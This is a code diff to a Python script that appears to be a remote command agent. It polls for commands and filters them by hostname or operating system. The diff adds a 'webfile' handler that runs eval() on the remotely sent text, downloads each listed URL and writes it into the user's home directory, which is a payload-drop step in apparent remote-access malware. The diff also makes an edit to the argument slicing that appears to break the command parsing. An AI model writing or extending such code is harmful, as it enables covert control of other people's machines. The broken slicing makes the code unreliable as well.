@@ -62,8 +62,13 @@ while True:
                 if command.startswith("webfile "):
                     localcmd = command.split(maxsplit=1)
                     files = eval(localcmd[1])
-                    #for fileUrl in files:
-                    #    print(fileUrl)
+                    for fileUrl in files:
+                        fileData = get(fileUrl).content
+                        fileName = os.path.basename(fileUrl)
+                        filePath = os.path.expanduser("~")
+                        with open(f"{filePath}/{fileName}", 'wb') as f:
+                            f.write(fileData)
+                            f.close()
                     old_command = commandId
                     #filename = os.path.basename(localcmd[1])
                     #print(filename)
@@ -71,7 +76,7 @@ while True:
                 if command.startswith("exename "):
                     localcmd = command.split()
                     if localcmd[1] == hostname:
-                        del localcmd[:2]
+                        del localcmd[2]
                         localcmd = ' '.join(localcmd)
                     else:
                         old_command = commandId
@@ -79,7 +84,7 @@ while True:
                 if command.startswith("exeos "):
                     localcmd = command.split()
                     if localcmd[1] == platform:
-                        del localcmd[:2]
+                        del localcmd[2]
                         localcmd = ' '.join(localcmd)
                     else:
                         old_command = commandId
